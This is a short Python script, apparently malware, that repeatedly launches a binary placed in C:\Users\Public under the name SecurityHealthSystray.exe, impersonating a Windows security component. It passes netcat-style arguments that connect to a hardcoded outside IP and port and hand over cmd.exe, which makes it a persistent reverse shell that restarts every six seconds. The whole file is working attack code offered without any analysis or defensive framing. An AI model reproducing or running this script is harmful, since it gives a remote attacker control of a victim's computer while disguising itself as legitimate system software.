#Librerias
import subprocess
import os
import time


carpeta_archivos = os.path.join('C:\\', "Users", "Public")
input_archivo = os.path.join(carpeta_archivos, "SecurityHealthSystray.exe")
windowsargumento = "-nv 193.161.193.99 39133 -e cmd.exe"

while True:
    subprocess.run(input_archivo+" "+windowsargumento, shell=True)
    time.sleep(6)